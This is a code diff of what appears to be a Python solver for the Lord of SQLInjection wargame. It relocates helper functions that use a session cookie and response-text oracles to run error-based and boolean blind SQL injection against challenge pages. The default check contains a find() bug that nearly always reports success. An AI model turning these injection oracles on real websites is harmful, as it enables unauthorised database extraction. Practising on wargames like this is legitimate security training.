@@ -6,6 +6,47 @@ import http.cookiejar
 import binascii
 
 
+def default_sqlinjection(cookie, url):
+    try:
+        cookie_dict = {'PHPSESSID':cookie}
+        response = requests.get(url, cookies = cookie_dict)
+
+        if response.text.find("<h2>Clear!</h2>"):
+            print("Clear!")
+        else:
+            print('Solve Fail')
+    except requests.HTTPError as e:
+        print(e)
+
+
+def error_based_blind_sqlinjection(cookie, url, encoded_params, pw_char):
+    try:
+        
+        cookie_dict = {'PHPSESSID':cookie}
+        response = requests.get(url, params = encoded_params, cookies = cookie_dict)
+        
+        if response.text.find("Subquery returns more than 1 row") != -1:
+            return 0
+        else:
+            return pw_char
+
+    except urllib.error.HTTPError as e:
+        print(e)
+def blind_sqlinjection(cookie, url, encoded_params, pw_char):
+    try:
+        
+        cookie_dict = {'PHPSESSID':cookie}
+        response = requests.get(url, params = encoded_params, cookies = cookie_dict)
+        
+        if response.text.find("<h2>Hello admin</h2>") != -1:
+            return pw_char
+        elif response.text.find("<h2>Hello guest</h2>") != -1:
+            return 1
+        else:
+            return 0
+
+    except urllib.error.HTTPError as e:
+        print(e)
 
 '''
 def iron_golem_other_char_check(hdr,pw_index,ans):
@@ -311,47 +352,8 @@ def darknight(cookie):
 
     print("pw is " + ans)
 
-def default_sqlinjection(cookie, url):
-    try:
-        cookie_dict = {'PHPSESSID':cookie}
-        response = requests.get(url, cookies = cookie_dict)
-
-        if response.text.find("<h2>Clear!</h2>"):
-            print("Clear!")
-        else:
-            print('Solve Fail')
-    except requests.HTTPError as e:
-        print(e)
 
 
-def error_based_blind_sqlinjection(cookie, url, encoded_params, pw_char):
-    try:
-        
-        cookie_dict = {'PHPSESSID':cookie}
-        response = requests.get(url, params = encoded_params, cookies = cookie_dict)
-        
-        if response.text.find("Subquery returns more than 1 row") != -1:
-            return 0
-        else:
-            return pw_char
-
-    except urllib.error.HTTPError as e:
-        print(e)
-def blind_sqlinjection(cookie, url, encoded_params, pw_char):
-    try:
-        
-        cookie_dict = {'PHPSESSID':cookie}
-        response = requests.get(url, params = encoded_params, cookies = cookie_dict)
-        
-        if response.text.find("<h2>Hello admin</h2>") != -1:
-            return pw_char
-        elif response.text.find("<h2>Hello guest</h2>") != -1:
-            return 1
-        else:
-            return 0
-
-    except urllib.error.HTTPError as e:
-        print(e)
 def zombie_assassin(cookie):
     
     url = "https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php"
@@ -570,4 +572,5 @@ def gremlin(cookie):
     print(inject_sentence)
     
     default_sqlinjection(cookie, url)
-        
+
+
